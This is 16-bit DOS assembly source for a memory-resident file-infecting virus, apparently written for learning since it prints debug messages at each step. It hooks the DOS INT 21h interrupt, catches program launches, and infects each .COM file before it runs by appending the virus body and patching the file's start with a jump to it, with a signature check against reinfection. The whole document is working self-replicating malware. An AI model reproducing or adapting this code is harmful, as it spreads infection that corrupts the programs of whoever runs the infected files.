
;----------------------------------------------------------------------------
; Printf
;----------------------------------------------------------------------------
; Description: Displays a string, and goes to the next line. The string should end with a NULL character 0x00
; Arguments:  ds:si: Address of the string to be displayed
; Registers Destroyed: ax
Printf PROC
push bx
mov ah,0Eh ;teletype output
xor bx, bx ;page 0
DISPLAY_CHAR:
lodsb ;get next character
int 10h ;display
test al, al ;end of string?
jne DISPLAY_CHAR
mov al,0Dh ;display carriage return 
int 10h
mov al,0Ah ;  and line feed
int 10h
pop bx
ret
Printf ENDP
;----------------------------------------------------------------------------
; HookISR
;----------------------------------------------------------------------------
; Description: Installs a new interrupt service routine
; Arguments: AL: Interrupt number , SI: Buffer in which to save old ISR address (DWORD) , DX: Address of new ISR
; Registers Destroyed: ax, bx, es
HookISR PROC
lea si,newisr
call Printf 
;cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared. 
mov ah, 35h ; saving old interrupt vector --> Get current interrupt handler for INT 21h . AH=35h - GET INTERRUPT VECTOR and AL=21h for int 21
int 21h ;Get Address of Old ISR  --> Call DOS  (Current interrupt handler returned in ES:BX)
mov word ptr [si], bx ;Save it si+2 = segment and si = offset
mov word ptr [si+2], es 
;lea dx, myint21h ; Load DX with the offset address of the start of this TSR program (the virus body) dx is a input
mov ah, 25h ;Install New ISR --> DOS function 25h SET INTERRUPT VECTOR for interrupt 21h
int 21h
;sti ;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
lea si,hookdone
call Printf  
ret
HookISR ENDP
;----------------------------------------------------------------------------
; InfectFile
;----------------------------------------------------------------------------
; Description: Attaches the virus to the file (infect) if not already infected
; Arguments: _DX_DS contains the name of the file to be infected
; Registers Destroyed: dx si ax ds ah bx cx 
InfectFile PROC
GetRelocation bp
lea si,[bp+sFileOpen]
call Printf
;  OPEN FILE 
lds dx, cs:dword ptr [bp+_DX_DS] ;get the file name to be infected
mov si, dx
call Printf ;display the filename
mov ax, 3D02h ;open file for reading/writing
int 21h
pushf
PrintReturnCode ;display the handle of the file
popf
jnc FILE_OPENED
ret
FILE_OPENED:
mov [bp+wHostFileHandle], ax ;save handle
push cs
pop ds ;restore DS
lea si, [bp+sFileCheck]
call Printf
; READ FIRST 5 BYTES 
mov ah,3Fh ;read ...
mov bx, [bp+wHostFileHandle]
mov cx,5 ;... 5 bytes from the file
lea dx,[bp+HostBytesOld] ;address of buffer in which to read
int 21h
pushf
PrintReturnCode ;display number of bytes read
popf
jnc FILE_READ_OK
jmp CLOSE_FILE
FILE_READ_OK:
lea si,[bp+sFileSignature]
call Printf
; CHECK SIGNATURE com or exe for now cant take exe
xchg di, dx ;DX=buffer where data has been read
mov ax, 5A4Dh ;EXE signature = 'MZ' (M=4Dh, Z=5Ah)
cmp ax, [di]
jne COM_FILE
jmp CLOSE_FILE ;file is an EXE file, cannot infect
COM_FILE:
lea si,[bp+sComFile]
call Printf
; CHECK FILE FOR PRIOR INFECTION 
mov ax,[di+3] ;get host signature
lea bx,[bp+VirusSignature]
cmp ax, [bx] ;check signature
jne FILE_NOT_INFECTED
lea si,[bp+sAlreadyInfected]
call Printf
jmp CLOSE_FILE
FILE_NOT_INFECTED:
; ADD CODE TO HOST FILE 
mov ax, 4202h ;go to end-of-file
mov bx, [bp+wHostFileHandle]
xor cx, cx
xor dx, dx
int 21h
jnc MOVE_PTR_OK
jmp CLOSE_FILE
MOVE_PTR_OK:
sub ax, 3 ;length of a JMP instruction (E9 xx xx)
mov [bp+wHostFileLength], ax ;save the length of the file (minus 3)
lea si,[bp+sPointerMoved]
call Printf
mov ah,40h ;append virus code(write it !!)
mov bx, [bp+wHostFileHandle]
lea dx, [bp+START]
mov cx, offset END_OF_CODE-offset START
int 21h
jc CLOSE_FILE
lea si, [bp+sFileInfected]
call Printf
; ADD JMP INSTRUCTION TO BEGINNING OF HOST 
mov ax, 4200h ;go to beginning-of-file
mov bx, [bp+wHostFileHandle]
xor cx, cx
xor dx, dx
int 21h
jc CLOSE_FILE
PrintReturnCode
lea si,[bp+sPointerMoved]
call Printf
mov ah, 40h ;write the jmp instruction to the file
mov bx, [bp+wHostFileHandle]
lea dx, [bp+HostBytesNew]
mov cx, 5 ;3 for the jmp instruction, and 2 for ...
int 21h ;... the virus signature
jc CLOSE_FILE
lea si,[bp+sJumpUpdated]
call Printf
PrintReturnCode
CLOSE_FILE: ; CLOSE FILE 
lea si, [bp+sClosingFile]
call Printf
mov ah,3Eh
mov bx, [bp+wHostFileHandle]
int 21h
PrintReturnCode
ret
InfectFile ENDP
;----------------------------------------------------------------------------
; NewDosISR
;----------------------------------------------------------------------------
; Description: Replacment ISR for DOS INT 21h--> after hook the ISR This routine will take place
; Arguments: <none>
; Registers Destroyed: <none>
NewDosISR PROC
SaveRegisters
 mov dl,'N' ; print 'N'
   mov ah,2h
   int 21h
RestoreRegisters
pushf ; push the flags reg
cmp ax, nVirusID ;routine to check residency of virus?
jne NOT_VIRUS_CHECK
popf ;because we pushed the flags before comparing
xchg ax, bx ;tell calling program that we're resident --> exchange data ax and bx
iret ;return, since we don't have to call old ISR --> Interrupt Return 
;iret pops CS, the flags register, and the instruction pointer from the stack and resumes the routine that was interrupted.
NOT_VIRUS_CHECK:
cmp ax, 4B00h ;load and execute file? -->Function 4B00h =Load and Execute Program (EXEC) ,
;Loads a program into memory, creates a new program segment prefix (PSP), and transfers control to the new program.
je EXEC_FN
popf ;because we pushed the flags before comparing
;JUMP TO OLD ISR 
;The following two lines will jump the old ISR
;These lines are equivalent to jmp dwOldExecISR
db 0EAh ;op code for inter segment JMP instruction
dwOldExecISR DD ? ;old ISR address is stored here
EXEC_FN:
popf ;because we pushed the flags before comparing
;SAVE FILENAME ADDRESS 
push bp ;GetRelocation pop bp
GetRelocation bp
mov word ptr[cs:[bp+_DX_DS]], dx ;DS:DX contains the filename. we must save
mov word ptr[cs:[bp+_DX_DS+2]], ds ;these, because they will be destroyed after the call to INT 21h
pop bp 
;CALL ROUTINE TO INFECT FILE 
SaveRegisters ;we don't want to mess up, since this is an ISR
push cs
push cs
pop ds ;make DS ...
pop es ;... and ES = CS
cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared.
call InfectFile ;infect the file before it is executed
sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
RestoreRegisters ;restore before calling orignal ISR
;CALL OLD ISR 
pushf ;because an iret will pop the flags, CS and IP
DB 2Eh, 0FFh, 1Eh ;op code for CALL FAR CS:[xxxx]
dwOldExecISRVariable DW ? ;address of dwOldExecISR (defined above)
;UPDATE OLD FLAGS ON STACK 
pushf ;this is the IMPORTANT part. we must pass
push bp ;the new flags back, and not the old ones.
push ax
mov bp, sp
mov ax, [bp+4] ;get new flags (which we just pushed 'pushf')
mov [bp+10], ax ;replace the old flags with the new. the stack
pop ax ;initially had FLAGS, CS, IP (in that order)
pop bp
popf
iret
 ;iret is used to restore cs,ip and flags
;from flag, because they are pushed on
;stack when an interrupt occurs.
NewDosISR ENDP
